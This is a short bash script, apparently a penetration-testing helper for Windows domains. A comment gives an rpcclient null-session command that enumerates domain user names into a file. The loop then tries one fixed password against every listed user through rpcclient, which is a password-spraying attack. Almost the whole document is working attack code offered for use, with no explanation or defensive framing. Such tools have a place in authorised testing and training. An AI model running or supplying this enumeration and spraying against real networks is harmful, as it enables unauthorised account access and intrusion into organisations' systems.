#!/bin/bash

# Generate domain-users.txt with the command below:
# rpcclient -U ""%"" 192.168.1.1 -c enumdomusers | cut -d" " -f1 | cut -d":" -f2 | tr -d "[" | tr -d "]" > domain-users.txt
# Supply a valid user and password when you have domain-level privilege\

for u in `cat domain-users.txt`;
do
        echo -n "[*] user: $u"
        rpcclient -W DOMAIN.COM -U $u%password -c "getusername;quit" 192.168.1.1
done

